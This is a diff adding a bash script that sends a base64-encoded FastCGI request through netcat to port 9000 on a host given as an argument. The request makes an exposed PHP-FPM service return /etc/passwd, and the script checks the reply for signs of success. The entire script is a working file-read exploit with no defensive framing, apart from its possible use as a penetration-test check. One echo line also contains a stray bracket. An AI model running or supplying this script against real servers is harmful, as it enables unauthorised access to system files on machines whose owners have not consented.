@@ -1,0 +1,19 @@
+#!/bin/bash
+
+# script will try to exfiltrate /etc/passwd from target host
+
+payload="AQEAAQAIAAAAAQAAAAAAAAEEAAEARwEACwtTQ1JJUFRfTkFNRS9ldGMvcGFzc3dkDwtTQ1JJUFRfRklMRU5BTUUvZXRjL3Bhc3N3ZA4DUkVRVUVTVF9NRVRIT0RHRVQAAQQAAQAAAAABBQABAAAAAA=="
+
+echo "Trying to exfiltrate /etc/passwd from $1"
+
+ret="$(echo $payload | base64 -d | nc $1 9000)"
+
+echo "$ret" |grep -qi "content-type"
+[ $? -eq 0 ] && echo "Got response, looks like open FPM port"
+
+echo "$ret" ] | grep -q "root:"
+[ $? -eq 0 ] && echo "Response looks like passwd file, seems we can exfiltrate"
+
+echo
+echo "Response:"
+echo "$ret"
